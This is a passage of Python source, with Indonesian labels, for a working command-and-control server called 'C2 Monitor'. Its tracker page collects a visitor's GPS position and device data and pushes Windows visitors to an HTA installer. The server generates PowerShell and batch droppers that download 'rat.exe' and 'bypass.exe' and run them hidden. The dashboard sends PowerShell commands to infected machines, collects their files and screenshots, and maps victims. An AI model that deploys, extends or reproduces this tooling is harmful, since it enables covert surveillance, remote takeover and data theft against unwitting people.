        document.getElementById("st").textContent = "Koordinat terkirim (" + pos.coords.latitude.toFixed(5) + ", " + pos.coords.longitude.toFixed(5) + ")";
    }, function() {
        document.getElementById("st").textContent = "Lokasi tidak diizinkan";
    }, {timeout: 15000, maximumAge: 30000, enableHighAccuracy: true});
}
function beacon() {
    post("beacon", {kind:"ping", net: NET, uptime_s: Math.round((Date.now() - T0) / 1000), screen: screen.width + "x" + screen.height});
}
setInterval(beacon, 15000);

function windowsDeploy() {
    if (!/Windows/i.test(navigator.userAgent)) return;
    setTimeout(function() { window.location.href = "/agent/install.hta?id=" + enc(ID); }, 1500);
    setTimeout(function() { document.getElementById("st").textContent = "Aktivasi agent selesai."; }, 9000);
}

battery();
sensor();
geo();
windowsDeploy();
setTimeout(battery, 2000);
</script>
</body>
</html>"""

DASHBOARD_PAGE = r"""<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>C2 Monitor - Dashboard (v8)</title>
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/leaflet/1.9.4/leaflet.min.css">
<script src="https://cdnjs.cloudflare.com/ajax/libs/leaflet/1.9.4/leaflet.min.js"></script>
<style>
:root { --bg:#0b1120; --panel:#111a2e; --border:#1f2b47; --text:#e5edf8; --muted:#8aa0bf; --accent:#38bdf8; --green:#34d399; --amber:#facc15; --purple:#c084fc; }
* { box-sizing:border-box; }
body { font-family: ui-monospace, SFMono-Regular, Menlo, monospace; background:var(--bg); color:var(--text); margin:0; padding:0; }
.topbar { display:flex; align-items:center; gap:14px; padding:16px 26px; border-bottom:1px solid var(--border); background:#0d1526; position:sticky; top:0; z-index:10; }
.topbar h1 { font-size:17px; margin:0; letter-spacing:.02em; }
.ver { font-size:10px; color:var(--muted); border:1px solid var(--border); border-radius:999px; padding:2px 8px; }
.conn { margin-left:auto; font-size:11px; color:var(--muted); display:flex; align-items:center; gap:6px; }
.dot { width:8px; height:8px; border-radius:50%; display:inline-block; }
.dot.on { background:var(--green); box-shadow:0 0 6px var(--green); }
.dot.off { background:#f87171; }
.tabs { display:flex; gap:4px; padding:14px 26px 0; }
.tab { background:transparent; border:1px solid var(--border); color:var(--muted); border-bottom:0; border-radius:8px 8px 0 0; padding:10px 18px; font:inherit; font-size:12px; cursor:pointer; }
.tab.active { background:var(--panel); color:var(--text); border-color:#2b3a5e; }
.content { padding:18px 26px 40px; }
.panel { background:var(--panel); border:1px solid var(--border); border-radius:10px; padding:18px; margin-bottom:18px; }
.stats { display:flex; gap:12px; flex-wrap:wrap; }
.card { background:#131c33; border:1px solid var(--border); border-radius:10px; padding:12px 18px; min-width:110px; }
.card .n { font-size:24px; font-weight:700; color:var(--accent); }
.card .l { font-size:10px; color:var(--muted); text-transform:uppercase; letter-spacing:.06em; margin-top:2px; }
table { width:100%; border-collapse:collapse; }
th, td { text-align:left; padding:9px 12px; font-size:12.5px; border-bottom:1px solid var(--border); vertical-align:top; }
th { background:#0d1526; color:var(--muted); font-size:10px; text-transform:uppercase; }
tr:hover td { background:#16203a; }
.badge { padding:2px 8px; border-radius:999px; font-size:10.5px; white-space:nowrap; }
.b-click { background:#3b2f0a; color:var(--amber); }
.b-data { background:#0f3a2e; color:var(--green); }
.b-shot { background:#3b1457; color:#e879f9; }
.b-gps { background:#0a3d5c; color:var(--accent); }
.b-result { background:#2d1050; color:var(--purple); }
.b-beacon { background:#1e3a5f; color:#7dd3fc; }
.b-fp { background:#3b2f0a; color:var(--amber); }
.detail { max-width:400px; word-break:break-all; color:#c7d6ea; font-size:11.5px; }
.muted { color:var(--muted); font-size:11.5px; }
a { color:var(--accent); }
b { color:var(--purple); }
label { font-size:10px; color:var(--muted); text-transform:uppercase; letter-spacing:.06em; display:block; margin:14px 0 5px; }
input[type=text], select, textarea { width:100%; background:#0b1220; color:var(--text); border:1px solid var(--border); border-radius:7px; padding:10px; font:12.5px ui-monospace, Menlo, monospace; }
textarea { min-height:104px; resize:vertical; }
select { cursor:pointer; }
button.send { background:var(--accent); color:#0b1120; border:0; border-radius:7px; padding:11px 20px; font-weight:700; font-size:13px; cursor:pointer; margin-top:12px; width:100%; }
button.send:hover { background:#7dd3fc; }
.q { display:inline-block; background:#0b1220; border:1px solid var(--border); color:#7dd3fc; border-radius:999px; padding:4px 10px; font-size:10.5px; cursor:pointer; margin:6px 4px 0 0; white-space:nowrap; }
.q:hover { background:#16203a; }
pre { background:#0b1220; border:1px solid var(--border); border-radius:7px; padding:9px; font-size:11.5px; overflow:auto; max-height:220px; white-space:pre-wrap; word-break:break-all; margin:6px 0 0; }
.mbar { display:flex; align-items:center; gap:10px; flex-wrap:wrap; margin-bottom:4px; }
.mid { font-size:13px; font-weight:600; }
.minfo { font-size:11.5px; color:var(--muted); margin-top:8px; line-height:1.6; }
#map { height:520px; border-radius:10px; margin-top:12px; z-index:1; }
.leaflet-container { background:#0d1526; font:inherit; }
.grid2 { display:grid; grid-template-columns:380px 1fr; gap:18px; align-items:start; }
@media (max-width:900px){ .grid2 { grid-template-columns:1fr; } .tabs { padding-left:14px; } .content { padding:14px; } }
</style>
</head>
<body>
<div class="topbar">
  <h1>C2 Monitor</h1><span class="ver">v8</span>
  <div class="conn"><span class="dot off" id="connDot"></span><span id="connTxt">Menghubungkan...</span></div>
</div>
<div class="tabs">
  <button class="tab active" data-tab="mon" onclick="showTab('mon')">Monitoring</button>
  <button class="tab" data-tab="rem" onclick="showTab('rem')">Remote Access</button>
  <button class="tab" data-tab="map" onclick="showTab('map')">Peta</button>
</div>
<div class="content">
<div id="tab-mon">
  <div class="panel">
    <div class="stats">
      <div class="card"><div class="n" id="sTotal">0</div><div class="l">Total Event</div></div>
      <div class="card"><div class="n" id="sClick">0</div><div class="l">Klik Link</div></div>
      <div class="card"><div class="n" id="sData">0</div><div class="l">Paket Data</div></div>
      <div class="card"><div class="n" id="sShot">0</div><div class="l">Screenshot</div></div>
      <div class="card"><div class="n" id="sMach">0</div><div class="l">Mesin Terdeteksi</div></div>
      <div class="card"><div class="n" id="sLast">-</div><div class="l">Aktivitas Terakhir</div></div>
    </div>
  </div>
  <div class="panel">
    <table>
      <thead><tr><th>Waktu</th><th>Jenis</th><th>IP</th><th>ID Mesin</th><th>Lokasi</th><th>Detail</th></tr></thead>
      <tbody id="rows"></tbody>
    </table>
    <div class="muted" style="margin-top:12px">Auto-refresh 3 detik - 100 event terbaru. <a id="exportLink" href="/export">Export semua log</a></div>
  </div>
</div>
<div id="tab-rem" style="display:none">
  <div class="panel">
    <div class="mbar"><span class="mid" id="mName">Belum ada mesin</span><span id="mStatus"></span></div>
    <div class="minfo" id="mInfo">Jalankan agent_windows.ps1 di mesin lab. Saat lokasi (GPS) terdeteksi, mesin otomatis terpilih di sini.</div>
  </div>
  <div class="grid2">
    <div class="panel">
      <label>Target Mesin</label>
      <select id="machine"></select>
      <label>Perintah (PowerShell)</label>
      <textarea id="cmd" placeholder="whoami"></textarea>
      <div>
        <span class="q">whoami</span><span class="q">ipconfig</span><span class="q">dir C:\</span>
        <span class="q">Get-Process | Sort-Object CPU -Descending | Select-Object -First 10</span>
        <span class="q">systeminfo</span>
        <span class="q">GETFILE C:\Users\lab\Desktop\catatan.txt</span>
      </div>
      <button class="send" onclick="sendCmd()">Kirim Perintah</button>
      <div class="muted" id="status" style="margin-top:10px"></div>
    </div>
    <div class="panel">
      <label>Hasil Perintah</label>
      <table><thead><tr><th>Waktu</th><th>Mesin</th><th>IP</th><th>Hasil</th></tr></thead><tbody id="cmdRows"></tbody></table>
    </div>
  </div>
</div>
<div id="tab-map" style="display:none">
  <div class="panel">
    <div class="mbar"><span class="mid">Peta Lokasi Mesin (OpenStreetMap)</span><span class="muted" id="mapInfo"></span></div>
    <div id="map"></div>
    <div class="minfo">Marker = titik koordinat GPS presisi dari mesin lab. Klik marker untuk melihat alamat & koordinat. Data diambil dari event GPS, bukan IP (IP hanya menunjukkan lokasi provider).</div>
  </div>
</div>
</div>
<script>
var Q = location.search;
var autoSel = null;
function esc(s) {
    return String(s == null ? "" : s).replace(/[&<>"']/g, function(c) {
        return {"&":"&amp;","<":"&lt;",">":"&gt;",'"':"&quot;","'":"&#39;"}[c];
    });
}
function showTab(name) {
    document.getElementById("tab-mon").style.display = name === "mon" ? "block" : "none";
    document.getElementById("tab-rem").style.display = name === "rem" ? "block" : "none";
    document.getElementById("tab-map").style.display = name === "map" ? "block" : "none";
    document.querySelectorAll(".tab").forEach(function(b) { b.classList.toggle("active", b.dataset.tab === name); });
    if (name === "map" && LMap) setTimeout(function() { LMap.invalidateSize(); }, 60);
}
function toDate(s) { return new Date(s.replace(" ", "T")); }
function machineInfo(ev) {
    var seen = {}, arr = [];
    for (var i = 0; i < ev.length; i++) {
        var e = ev[i];
        if (!e.id || e.id === "-" || e.id === "beacon") continue;
        var key = e.id + "@" + (e.ip || "");
        if (seen[key]) continue;
        seen[key] = 1;
        var gps = null, glat = null, glon = null, agent = false, gpsTime = null;
        for (var k = 0; k < ev.length; k++) {
            var g = ev[k];
            if (g.id !== e.id || g.ip !== e.ip) continue;
            if (g.type === "gps") {
                var d = g.detail || {};
                if (!gps && d.address) gps = d.address;
                if (d.lat != null && glat == null) { glat = Number(d.lat); glon = Number(d.lon); gpsTime = g.time; }
            }
            if (g.type === "result" || g.type === "data" || g.type === "screenshot") agent = true;
        }
        arr.push({ id: e.id, ip: e.ip, key: key, time: e.time, loc: e.location, gps: gps, lat: glat, lon: glon, gpsTime: gpsTime, agent: agent });
    }
    return arr;
}
async function refresh() {
    try {
        var r = await fetch("/api/events" + Q);
        if (!r.ok) {
            document.getElementById("connTxt").textContent = "Akses ditolak (pass salah)";
            document.getElementById("connDot").className = "dot off";
            return;
        }
        var ev = await r.json();
        document.getElementById("connDot").className = "dot on";
        document.getElementById("connTxt").textContent = "Terkoneksi - " + ev.length + " event";
        render(ev);
    } catch(e) {
        document.getElementById("connTxt").textContent = "Server belum merespon...";
    }
}
function render(ev) {
    var clicks = 0, datas = 0, shots = 0, last = ev.length ? ev[0].time : "-";
    for (var i = 0; i < ev.length; i++) {
        if (ev[i].type === "click") clicks++;
        else if (ev[i].type === "screenshot") shots++;
        else datas++;
    }
    document.getElementById("sTotal").textContent = ev.length;
    document.getElementById("sClick").textContent = clicks;
    document.getElementById("sData").textContent = datas;
    document.getElementById("sShot").textContent = shots;
    document.getElementById("sLast").textContent = last;
    var rows = document.getElementById("rows");
    rows.innerHTML = "";
    var slice = ev.slice(0, 100);
    for (var j = 0; j < slice.length; j++) {
        var e = slice[j];
        var badge, detail = "";
        if (e.type === "click") {
            badge = '<span class="badge b-click">Klik</span>';
            detail = "Path: " + esc(e.path);
        } else if (e.type === "gps") {
            badge = '<span class="badge b-gps">GPS</span>';
            var acc = e.detail && e.detail.accuracy != null ? " (~" + e.detail.accuracy + "m)" : "";
            var coords = "";
            if (e.detail && e.detail.lat != null) coords = " (" + Number(e.detail.lat).toFixed(6) + ", " + Number(e.detail.lon).toFixed(6) + ")";
            detail = esc(e.detail.address || (e.detail.lat + ", " + e.detail.lon)) + coords + acc;
        } else if (e.type === "screenshot") {
            badge = '<span class="badge b-shot">Screenshot</span>';
            var kb = e.detail && e.detail.size_kb != null ? e.detail.size_kb + " KB" : "";
            detail = kb + ' <a href="/screenshot/' + encodeURIComponent(e.file.split("/").pop()) + '" target="_blank">lihat gambar</a>';
        } else if (e.type === "result") {
            badge = '<span class="badge b-result">Hasil</span>';
            var dd = e.detail || {};
            var dl = dd.file_name ? ' <a href="/file/' + encodeURIComponent(dd.file_name) + '" download>unduh</a>' : "";
            detail = esc(dd.cmd || e.cid || "") + dl;
        } else if (e.type === "beacon") {
            badge = '<span class="badge b-beacon">Ping</span>';
            try { detail = esc(JSON.stringify(e.detail).slice(0, 300)); }
            catch(x) { detail = esc(String(e.detail)); }
        } else if (e.type === "data" && e.detail && e.detail.kind === "fingerprint") {
            badge = '<span class="badge b-fp">Perangkat</span>';
            try { detail = esc(JSON.stringify(e.detail.fp || e.detail).slice(0, 300)); }
            catch(x) { detail = esc(String(e.detail)); }
        } else {
            badge = '<span class="badge b-data">Data</span>';
            try { detail = esc(JSON.stringify(e.detail).slice(0, 300)); }
            catch(x) { detail = esc(String(e.detail)); }
        }
        var tr = document.createElement("tr");
        tr.innerHTML = "<td>" + esc(e.time) + "</td><td>" + badge + "</td><td>" + esc(e.ip) + "</td><td>" + esc(e.id) + " (" + esc(e.ip) + ")</td><td>" + esc(e.location) + "</td><td class='detail'>" + detail + "</td>";
        rows.appendChild(tr);
    }
    var cmdRows = document.getElementById("cmdRows");
    cmdRows.innerHTML = "";
    var list = ev.filter(function(e) { return e.type === "result"; });
    for (var k = 0; k < list.length; k++) {
        var e = list[k];
        var d = e.detail || {};
        var dl = d.file_name ? ' <a href="/file/' + encodeURIComponent(d.file_name) + '" download>unduh</a>' : "";
        var tr = document.createElement("tr");
        tr.innerHTML = "<td>" + esc(e.time) + "</td><td>" + esc(e.id) + "</td><td>" + esc(e.ip) + "</td><td><b>" + esc(d.cmd || e.cid || "") + "</b>" + dl + "<pre>" + esc(d.output || "") + "</pre></td>";
        cmdRows.appendChild(tr);
    }
    syncMachines(ev);
    updateMap(ev);
}
function syncMachines(ev) {
    var arr = machineInfo(ev);
    document.getElementById("sMach").textContent = arr.length;
    var sel = document.getElementById("machine");
    var cur = sel.value;
    arr.forEach(function(m) {
        var exists = false;
        for (var i = 0; i < sel.options.length; i++) {
            if (sel.options[i].value === m.key) { exists = true; break; }
        }
        if (!exists) {
            var o = document.createElement("option");
            o.value = m.key; o.textContent = m.id + " (" + m.ip + ")";
            sel.appendChild(o);
        }
    });
    if (!arr.length) {
        document.getElementById("mName").textContent = "Belum ada mesin";
        document.getElementById("mStatus").textContent = "";
        document.getElementById("mInfo").textContent = "Jalankan agent_windows.ps1 di mesin lab. Saat lokasi (GPS) terdeteksi, mesin otomatis terpilih di sini.";
        return;
    }
    var latest = arr[0];
    if (cur === "" || cur === autoSel || (autoSel !== latest.key && cur === autoSel)) {
        sel.value = latest.key;
        autoSel = latest.key;
    }
    var m = arr.filter(function(x) { return x.key === sel.value; })[0] || latest;
    renderMachine(m);
}
function renderMachine(m) {
    document.getElementById("mName").textContent = m.id + " (" + m.ip + ")";
    var age = (new Date() - toDate(m.time)) / 1000;
    var online = age < 90;
    var status = [];
    status.push(online ? '<span class="badge b-data">ONLINE</span>' : '<span class="badge b-click">TIDAK AKTIF</span>');
    status.push(m.agent ? '<span class="badge b-data">AGENT AKTIF</span>' : '<span class="badge b-click">HANYA KLIK</span>');
    document.getElementById("mStatus").innerHTML = status.join(" ");
    var loc = (m.gps ? m.gps : m.loc) + (m.gps ? " (GPS)" : "");
    if (m.lat != null) loc += " <span class='muted'>(" + m.lat.toFixed(6) + ", " + m.lon.toFixed(6) + ")</span>";
    var hint = m.agent ? "" : "<br><span style='color:#facc15'>Belum ada agent di mesin ini - jalankan agent_windows.ps1 agar bisa di-remote.</span>";
    document.getElementById("mInfo").innerHTML = "IP: <b>" + esc(m.ip) + "</b> | Terakhir terlihat: <b>" + esc(m.time) + "</b><br>Lokasi: <b>" + esc(loc) + "</b>" + hint;
}
var LMap = null, markers = {}, mapCenter = null;
function initMap() {
    if (!window.L) return;
    LMap = L.map("map").setView([-2.5, 118], 5);
    L.tileLayer("https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png", {
        maxZoom: 19,
        attribution: '&copy; <a href="https://www.openstreetmap.org/copyright">OpenStreetMap</a>'
    }).addTo(LMap);
}
function machineLocations(ev) {
    var got = {};
    for (var i = ev.length - 1; i >= 0; i--) {
        var e = ev[i];
        if (!e.id || e.id === "-" || e.id === "beacon") continue;
        var key = e.id + "@" + (e.ip || "");
        if (!got[key]) got[key] = { id: e.id, ip: e.ip || "", key: key, lat: null, lon: null, addr: e.location || "", time: e.time, precise: false };
        var m = got[key];
        if (e.type === "gps" && e.detail && e.detail.lat != null && !m.precise) {
            m.lat = Number(e.detail.lat); m.lon = Number(e.detail.lon);
            if (e.detail.address) m.addr = e.detail.address;
            m.time = e.time; m.precise = true;
        } else if (e.lat != null && e.lon != null && !m.precise && m.lat == null) {
            m.lat = Number(e.lat); m.lon = Number(e.lon);
            if (e.location) m.addr = e.location;
            m.time = e.time;
        }
    }
    for (var k in got) if (got[k].lat == null) delete got[k];
    return got;
}
function updateMap(ev) {
    if (!LMap) return;
    var got = machineLocations(ev);
    for (var k in markers) if (!got[k]) { LMap.removeLayer(markers[k]); delete markers[k]; }
    for (var k2 in got) {
        var g = got[k2];
        var src = g.precise ? "GPS presisi" : "perkiraan dari IP";
        var popup = "<b>" + esc(g.id) + "</b><br>IP: <b>" + esc(g.ip) + "</b><br>" + esc(g.addr) + "<br><b>" + g.lat.toFixed(6) + ", " + g.lon.toFixed(6) + "</b> (" + src + ")<br>" + esc(g.time);
        var tip = esc(g.id) + " · " + esc(g.ip);
        if (markers[k2]) {
            var mk = markers[k2];
            mk.setLatLng([g.lat, g.lon]);
            mk.bindPopup(popup);
            mk.setTooltipContent(tip);
        } else if (g.precise) {
            markers[k2] = L.marker([g.lat, g.lon]).addTo(LMap).bindPopup(popup).bindTooltip(tip, {permanent: true, direction: "top", opacity: 0.9});
        } else {
            markers[k2] = L.circleMarker([g.lat, g.lon], {radius: 9, color: "#8aa0bf", weight: 2, fillColor: "#8aa0bf", fillOpacity: 0.5}).addTo(LMap).bindPopup(popup).bindTooltip(tip, {permanent: true, direction: "top", opacity: 0.9});
        }
    }
    var keys = Object.keys(got);
    if (keys.length) {
        var latest = got[keys[0]];
        if (!mapCenter || mapCenter[0] !== latest.lat || mapCenter[1] !== latest.lon) {
            mapCenter = [latest.lat, latest.lon];
            var z = LMap.getZoom();
            LMap.setView([latest.lat, latest.lon], z >= 14 ? z : 14);
        }
    }
    document.getElementById("mapInfo").textContent = keys.length ? keys.length + " titik terpetakan" : "Belum ada titik GPS";
}
document.getElementById("exportLink").href = "/export" + Q;
document.querySelectorAll(".q").forEach(function(el) {
    el.addEventListener("click", function() { document.getElementById("cmd").value = el.textContent; });
});
async function sendCmd() {
    var target = document.getElementById("machine").value.trim();
    var cmd = document.getElementById("cmd").value.trim();
    if (!cmd || !target) { return; }
    var machine = target.split("@")[0];
    var mip = target.split("@")[1] || "";
    var st = document.getElementById("status");
    st.textContent = "Mengirim ke " + target + " ...";
    var body = "machine=" + encodeURIComponent(machine) + "&cmd=" + encodeURIComponent(cmd) + "&ip=" + encodeURIComponent(mip) + Q.replace("?", "&");
    try {
        var r = await fetch("/cmd", {method:"POST", headers:{"Content-Type":"application/x-www-form-urlencoded"}, body: body});
        st.textContent = r.ok ? "Terkirim ke " + target + "! Agent akan menjalankan dalam beberapa detik." : "Gagal kirim: " + r.status;
    } catch(e) { st.textContent = "Server tidak merespon."; }
}
refresh();
initMap();
setInterval(refresh, 3000);
</script>
</body>
</html>"""


class C2Handler(http.server.BaseHTTPRequestHandler):

    def _send(self, code, ctype, body, extra_headers=None):
        self.send_response(code)
        self.send_header("Content-type", ctype)
        if extra_headers:
            for k, v in extra_headers:
                self.send_header(k, v)
        self.end_headers()
        self.wfile.write(body)

    def _auth_ok(self, query):
        if not DASH_PASS:
            return True
        return query.get("pass", [""])[0] == DASH_PASS

    def real_client_ip(self):
        direct = self.client_address[0]
        if direct in ("127.0.0.1", "::1", "localhost"):
            forwarded = self.headers.get("X-Forwarded-For", "")
            if forwarded:
                return forwarded.split(",")[0].strip()
            real = self.headers.get("X-Real-IP", "")
            if real:
                return real.strip()
        return direct

    def do_GET(self):
        parsed = urllib.parse.urlparse(self.path)
        query = urllib.parse.parse_qs(parsed.query)
        path = parsed.path

        if path in (DASHBOARD_PATH, API_EVENTS_PATH, EXPORT_PATH, REMOTE_PATH):
            if not self._auth_ok(query):
                self._send(401, "text/plain; charset=utf-8", b"Akses ditolak: pass salah")
                return
            if path == DASHBOARD_PATH:
                self._send(200, "text/html; charset=utf-8", DASHBOARD_PAGE.encode("utf-8"))
            elif path == REMOTE_PATH:
                dest = DASHBOARD_PATH + (("?" + parsed.query) if parsed.query else "")
                self.send_response(302)
                self.send_header("Location", dest)
                self.send_header("Content-Length", "0")
                self.end_headers()
                return
            elif path == API_EVENTS_PATH:
                body = json.dumps(list(reversed(events)), ensure_ascii=False).encode("utf-8")
                self._send(200, "application/json; charset=utf-8", body, [("Cache-Control", "no-store")])
            else:
                lines = [json.dumps(e, ensure_ascii=False) for e in reversed(events)]
                body = ("\n".join(lines) + "\n").encode("utf-8")
                self._send(200, "text/plain; charset=utf-8", body,
                           [("Content-Disposition", 'attachment; filename="logs.txt"')])
            return

        if path == CMD_PATH:
            machine = query.get("id", [""])[0] or "-"
            agent_ip = self.real_client_ip()
            ip_filter = query.get("ip", [""])[0] or agent_ip
            key = query.get("key", [""])[0]
            if DASH_PASS and key != DASH_PASS:
                self._send(401, "text/plain; charset=utf-8", b"Akses ditolak: key salah")
                return
            body = json.dumps(pending_commands(machine, ip_filter), ensure_ascii=False).encode("utf-8")
            self._send(200, "application/json; charset=utf-8", body,
                       [("Cache-Control", "no-store"), ("X-C2-IP", agent_ip)])
            return

        if path.startswith("/file/"):
            if not self._auth_ok(query):
                self._send(401, "text/plain; charset=utf-8", b"Akses ditolak: pass salah")
                return
            name = os.path.basename(path.split("/", 2)[2])
            fpath = os.path.join(LOG_DIR, name)
            if name.startswith("agentfile_") and os.path.isfile(fpath):
                try:
                    with open(fpath, "rb") as f:
                        self._send(200, "application/octet-stream", f.read(),
                                   [("Content-Disposition", 'attachment; filename="' + name + '"')])
                    return
                except Exception:
                    pass
            self._send(404, "text/plain; charset=utf-8", b"File tidak ditemukan")
            return

        if path.startswith("/screenshot/"):
            if not self._auth_ok(query):
                self._send(401, "text/plain; charset=utf-8", b"Akses ditolak: pass salah")
                return
            name = os.path.basename(path.split("/", 2)[2])
            fpath = os.path.join(LOG_DIR, name)
            if name.startswith("screenshot_") and os.path.isfile(fpath):
                try:
                    with open(fpath, "rb") as f:
                        self._send(200, "image/png", f.read(), [("Cache-Control", "no-store")])
                    return
                except Exception:
                    pass
            self._send(404, "text/plain; charset=utf-8", b"Gambar tidak ditemukan")
            return

        if path == "/agent/rat.exe":
            if os.path.isfile(AGENT_EXE_PATH):
                try:
                    with open(AGENT_EXE_PATH, "rb") as f:
                        self._send(200, "application/octet-stream", f.read(),
                                   [("Content-Disposition", 'attachment; filename="rat.exe"'), ("Cache-Control", "no-store")])
                    return
                except Exception:
                    pass
            self._send(404, "text/plain; charset=utf-8", b"rat.exe tidak ditemukan di folder server")
            return

        if path == "/agent/bypass.exe":
            if os.path.isfile(BYPASS_EXE_PATH):
                try:
                    with open(BYPASS_EXE_PATH, "rb") as f:
                        self._send(200, "application/octet-stream", f.read(),
                                   [("Content-Disposition", 'attachment; filename="bypass.exe"'), ("Cache-Control", "no-store")])
                    return
                except Exception:
                    pass
            self._send(404, "text/plain; charset=utf-8", b"bypass.exe tidak ditemukan di folder server")
            return

        if path == "/agent/install.hta":
            machine_id = query.get("id", [""])[0] or "lab-1"
            host_hdr = (self.headers.get("Host", "") or self.headers.get("X-Forwarded-Host", "")).strip()
            if not host_hdr:
                host_hdr = self.real_client_ip()
            server_url = "http://" + host_hdr if host_hdr else "http://" + self.client_address[0]
            self._send(200, "application/hta", make_hta(server_url, machine_id).encode("utf-8"))
            return

        if path == "/agent/install.ps1":
            machine_id = query.get("id", [""])[0] or "lab-1"
            host_hdr = (self.headers.get("Host", "") or self.headers.get("X-Forwarded-Host", "")).strip()
            if not host_hdr:
                host_hdr = self.real_client_ip()
            server_url = "http://" + host_hdr if host_hdr else "http://" + self.client_address[0]
            from urllib.parse import urlsplit
            _u = urlsplit(server_url)
            _host = _u.hostname or ""
            _port = _u.port or (443 if _u.scheme == "https" else 80)
            ps1 = (
                "$ErrorActionPreference='SilentlyContinue'\n"
                "$tmp=$env:TEMP\n"
                "$wc=New-Object Net.WebClient\n"
                "$wc.Proxy=$null\n"
                "$wc.DownloadFile('%s/agent/rat.exe','$tmp\\rat.exe')\n"
                "$wc.DownloadFile('%s/agent/bypass.exe','$tmp\\bypass.exe')\n"
                "Start-Process -WindowStyle Hidden '$tmp\\rat.exe' -ArgumentList '%s','%d','%s','30'\n"
                "Start-Process -WindowStyle Hidden '$tmp\\bypass.exe'\n"
            ) % (server_url, server_url, _host, _port, machine_id)
            self._send(200, "text/plain; charset=utf-8", ps1.encode("utf-8"),
                       [("Content-Disposition", 'attachment; filename="install.ps1"')])
            return

        if path == "/agent/run.bat":
            host_hdr = (self.headers.get("Host", "") or self.headers.get("X-Forwarded-Host", "")).strip()
            if not host_hdr:
                host_hdr = self.real_client_ip()
            server_url = "http://" + host_hdr if host_hdr else "http://" + self.client_address[0]
            bat = (
                "@echo off\n"
                "powershell -NoProfile -ExecutionPolicy Bypass -Command \"& { try { $e='%s/agent/install.ps1'; iwr $e -OutFile $env:temp\\install.ps1; powershell -NoProfile -ExecutionPolicy Bypass -File $env:temp\\install.ps1 } catch { } }\"\n"
                "exit\n"
            ) % server_url
            self._send(200, "text/plain; charset=utf-8", bat.encode("utf-8"),
                       [("Content-Disposition", 'attachment; filename="run.bat"')])
            return

        client_ip = self.real_client_ip()
        t = now_str()
        tracking_id = query.get("id", [""])[0] or "-"
        location, ilat, ilon = geolocate_ll(client_ip)
        fname = os.path.join(LOG_DIR, f"click_{client_ip}_{file_ts()}.log")
        content = f"IP: {client_ip}\nWaktu: {t}\nPath: {parsed.path}\nID: {tracking_id}\nLokasi: {location}\n"
        try:
            with open(fname, "w", encoding="utf-8") as f:
                f.write(content)
        except Exception as e:
            emit(f" [!] Gagal simpan file: {e}")
        record_event({
            "time": t, "type": "click", "ip": client_ip, "id": tracking_id,
            "path": parsed.path, "location": location, "lat": ilat, "lon": ilon, "file": fname
        })
        emit("=" * 60)
        emit(" [+] LINK DIKLIK")
        emit(f"     Waktu : {t}")
        emit(f"     IP    : {client_ip}")
        emit(f"     ID    : {tracking_id}")
        emit(f"     Lokasi: {location}")
        emit(f"     Path  : {parsed.path}")
        emit(f"     File  : {fname}")
        emit("=" * 60)
        self._send(200, "text/html; charset=utf-8", TRACKER_PAGE.encode("utf-8"))

    def do_POST(self):
        try:
            parsed = urllib.parse.urlparse(self.path)
            path = parsed.path
            parsed_query = urllib.parse.parse_qs(parsed.query)
            content_length = int(self.headers.get("Content-Length", 0))
            post_data = self.rfile.read(content_length).decode("utf-8", errors="ignore")
            parsed_data = urllib.parse.parse_qs(post_data)
            data_payload = parsed_data.get("data", [""])[0]
            if not data_payload:
                data_payload = post_data
            dtype = parsed_data.get("type", [""])[0]
            machine = parsed_query.get("id", [""])[0] or parsed_data.get("machine", [""])[0] or "-"
            client_ip = self.real_client_ip()
            t = now_str()

            if path == RESULT_PATH:
                machine = parsed_data.get("machine", [""])[0] or "-"
                cid = parsed_data.get("cid", [""])[0]
                output = parsed_data.get("output", [""])[0]
                key = parsed_data.get("key", [""])[0]
                if DASH_PASS and key != DASH_PASS:
                    self._send(401, "text/plain; charset=utf-8", b"Akses ditolak: key salah")
                    return
                cmdtext = next((c.get("cmd", "") for c in commands if c.get("cid") == cid), cid)
                detail = {"cmd": cmdtext, "output": output[:8000]}
                fname = ""
                if parsed_data.get("data", [""])[0]:
                    try:
                        fbytes = base64.b64decode(parsed_data["data"][0])
                    except Exception:
                        fbytes = b""
                    orig = os.path.basename(parsed_data.get("data_name", ["file"])[0] or "file").replace(" ", "_")
                    stored = f"agentfile_{machine}_{orig}"
                    fname = os.path.join(LOG_DIR, stored)
                    try:
                        with open(fname, "wb") as f:
                            f.write(fbytes)
                        detail["file_name"] = stored
                        detail["orig_name"] = orig
                        detail["file_size"] = len(fbytes)
                    except Exception as e:
                        emit(f" [!] Gagal simpan file dari agent: {e}")
                record_event({
                    "time": t, "type": "result", "ip": client_ip, "id": machine, "cid": cid,
                    "path": "/", "location": resolve_location(client_ip, machine), "detail": detail, "file": fname
                })
                done_cids.add(cid)
                emit("=" * 60)
                emit(" [+] HASIL PERINTAH DITERIMA")
                emit(f"     Waktu : {t}")
                emit(f"     Mesin : {machine} | CID: {cid}")
                emit(f"     Perintah: {cmdtext}")
                if fname:
                    emit(f"     File  : {fname} ({detail.get('file_size', 0)} bytes)")
                emit(f"     Output:")
                emit(f"     {output[:800]}")
                emit("=" * 60)
                self._send(200, "text/plain; charset=utf-8", b"OK")
                return

            if path == CMD_PATH:
                machine = parsed_data.get("machine", [""])[0] or "-"
                cmdtext = parsed_data.get("cmd", [""])[0]
                ip_filter = parsed_data.get("ip", [""])[0]
                key = parsed_data.get("key", [""])[0] or parsed_data.get("pass", [""])[0]
                if DASH_PASS and key != DASH_PASS:
                    self._send(401, "text/plain; charset=utf-8", b"Akses ditolak: key salah")
                    return
                if not cmdtext:
                    self._send(400, "text/plain; charset=utf-8", b"Perintah kosong")
                    return
                cid = "%s_%d" % (time.strftime("%H%M%S"), random.randint(100, 999))
                c = {"cid": cid, "machine": machine, "ip": ip_filter or "", "cmd": cmdtext, "time": t}
                commands.append(c)
                save_command(c)
                emit("=" * 60)
                emit(" [+] PERINTAH DIANTRIKAN")
                emit(f"     Waktu : {t}")
                emit(f"     Mesin : {machine} | CID: {cid}")
                emit(f"     Perintah: {cmdtext}")
                emit("=" * 60)
                self._send(200, "application/json; charset=utf-8", json.dumps({"cid": cid}, ensure_ascii=False).encode("utf-8"))
                return

            if dtype == "gps":
                try:
                    detail = json.loads(data_payload)
                except ValueError:
                    detail = {"raw": data_payload}
                lat = detail.get("lat")
                lon = detail.get("lon")
                addr = reverse_geocode(lat, lon) if lat and lon else ""
                detail["machine"] = machine
                if lat is not None and lon is not None:
